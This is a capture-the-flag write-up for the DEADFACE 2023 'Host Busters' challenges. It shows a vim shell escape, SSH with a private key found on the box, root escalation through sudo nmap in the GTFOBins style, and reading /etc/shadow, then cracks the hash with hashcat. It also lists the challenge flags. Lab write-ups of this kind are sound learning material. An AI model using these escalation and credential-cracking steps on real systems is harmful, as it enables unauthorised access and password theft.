---
tags:
  - ctf
  - 2023-deadface
  - forensics
  - linux
layout: ctf
type: problem
ctf: 2023-deadface
category: forensics
title: Host Busters
points: 750
solved: true
---

# Host Busters 1

## Instructions

Created by: syyntax

Turbo Tactical has gained access to a DEADFACE machine that belongs to `gh0st404`. This machine was used to scan one of TGRI’s websites. See if you can find anything useful in the `vim` user’s directory.

_On a side note, it’s also a good idea to collect anything you think might be useful in the future for going after DEADFACE._

Submit the flag as `flag{flag_here}`.

## Solution

Connect to the container with the SSH credentials provided in the challenge description.

Exit the vim interface with `:!/bin/bash` and read the first flag.

```
vim@fbca68866a64:~$ ls
hostbusters1.txt
vim@fbca68866a64:~$ cat hostbusters1.txt 
flag{esc4P3_fr0m_th3_V1M}
```

# Host Busters 2

## Instructions

Now that you’ve escaped out of `vim`, scope out and characterize the machine. See if there are any other flags you can find without having to escalate to another user.

Submit the flag as `flag{flag_here}`.

## Solution

While doing recon on the machine we see two listening services:
- SSH on TCP port 22 (we're using this to connect to the machine)
- Some UDP service on port 9023

Connecting to the unknown service on the udp port gives us the flag.

```
vim@fbca68866a64:~$ ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         
udp     UNCONN   0        0                0.0.0.0:9023          0.0.0.0:*       users:(("srv",pid=7,fd=3))                                                     
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128                 [::]:22               [::]:*                                                                                      
vim@fbca68866a64:~$ nc -u localhost 9023

flag{Hunt_4_UDP_s3rv3r}
```

# Host Busters 3

## Instructions

Continue characterizing the machine. Is there any way you can escalate to a user that has permissions the `vim` user does not have? Find the flag associated with this user.

Submit the flag as `flag{flag_here}`.

## Solution

Searching around we see the gh0st404 user's home directory which has the flag we want to read. However we're unable to read it with our current permissions.

```
vim@fbca68866a64:~$ ls /home
gh0st404  mort1cia  spookyboi  vim

vim@fbca68866a64:~$ cd /home/gh0st404/

vim@fbca68866a64:/home/gh0st404$ ls
config  hostbusters3.txt  id_rsa  tgri-alive.xml  tgri-scan.xml

vim@fbca68866a64:/home/gh0st404$ cat hostbusters3.txt 
cat: hostbusters3.txt: Permission denied
```

Use the `id_rsa` ssh key to connect to the machine locally as gh0st404.

```
vim@fbca68866a64:/home/gh0st404$ ssh -i id_rsa gh0st404@localhost

gh0st404@fbca68866a64:~$ cat hostbusters3.txt 
flag{Embr4c3_th3_K3y_t0_5ucc355!}
```

# Host Busters 4

## Instructions

TGRI believes a sensitive project proposal was compromised in a recent attack from DEADFACE. Find the proposal and submit the flag associated with this document.

Submit the flag as `flag{flag_here}`.

## Solution

Now that we're the gh0st404 user, we can see that they have permission to run nmap with sudo permissions. 

```
gh0st404@fbca68866a64:~$ sudo -l
Matching Defaults entries for gh0st404 on fbca68866a64:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User gh0st404 may run the following commands on fbca68866a64:
    (ALL) NOPASSWD: /usr/bin/nmap
    (ALL : ALL) NOPASSWD: /etc/init.d/ssh start
```

Use the escalation technique at [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo) to escalate to root.

```
gh0st404@fbca68866a64:~$ TF=$(mktemp)
gh0st404@fbca68866a64:~$ echo 'os.execute("/bin/bash")' > $TF
gh0st404@fbca68866a64:~$ sudo nmap --script=$TF
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-24 06:11 UTC
NSE: Warning: Loading '/tmp/tmp.J8glzTvOih' -- the recommended file extension is '.nse'.

root@fbca68866a64:/home/gh0st404# id
uid=0(root) gid=0(root) groups=0(root)
```

Looking around for interesting documents we find a pdf. At the bottom of the pdf is the base64 encoded flag.

```
root@fbca68866a64:/home# ls
gh0st404  mort1cia  spookyboi  vim

root@fbca68866a64:/home# cd spookyboi/

root@fbca68866a64:/home/spookyboi# ls
proposal.pdf

root@fbca68866a64:/home/spookyboi# tail -n 1 proposal.pdf | base64 -d 
Host Busters 4: flag{Abus3_oF_p0w3R}
```

If you exfiltrate the pdf and open it in a pdf viewer, the flag is also at the bottom of document in red.

# Host Busters 5

## Instructions

See if you can crack `gh0st404`’s password. Based on Ghost Town conversations, we suspect the password is found in common wordlists.

Submit the flag as `flag{password}`.

## Solution

Since we're already root getting the password hash for gh0st is trivial.

```
root@fbca68866a64:/home/spookyboi# cat /etc/shadow | grep gh0st
gh0st404:$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/:19568:0:99999:7:::
```

Grab just the hash portion of the shadow entry and feed it to hashcat. The challenge description hints that this should be easy to crack with a common wordlist like rockyou.

```
$ hashcat -m 1800 -a 0 hashes /usr/share/wordlists/rockyou.txt
$6$5d63619132db26f0$4FF5/xxtU1.OPzv2OdnWmB0mG5kqyMGUCAW8crE5ZqS24v6i1sM806eh8SigsZLxeJs/EtK0RJuB.eD.wTjLp/:zaq12wsx
```

The final flag:
```
flag{zaq12wsx}
```